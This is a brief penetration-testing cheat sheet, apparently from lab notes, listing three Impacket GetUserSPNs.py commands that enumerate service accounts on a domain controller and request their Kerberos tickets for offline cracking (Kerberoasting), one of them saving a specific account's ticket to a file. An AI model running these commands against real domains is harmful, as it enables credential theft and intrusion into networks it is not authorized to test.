# Impacket: Get User SPN Tickets`

List Tickets

```jsx
GetUserSPNs.py -dc-ip 172.16.5.5 TargetDomain.LOCAL/Your_USER
```

Request Ticket for offline processing

```jsx
GetUserSPNs.py -dc-ip 172.16.5.5 TargetDomain.LOCAL/Your_USER -request
```

Request Ticket for specific User

```jsx
GetUserSPNs.py -dc-ip 172.16.5.5 TargetDomain.LOCAL/Your_User -request-user sqldev -outputfile sqldev_tgs
```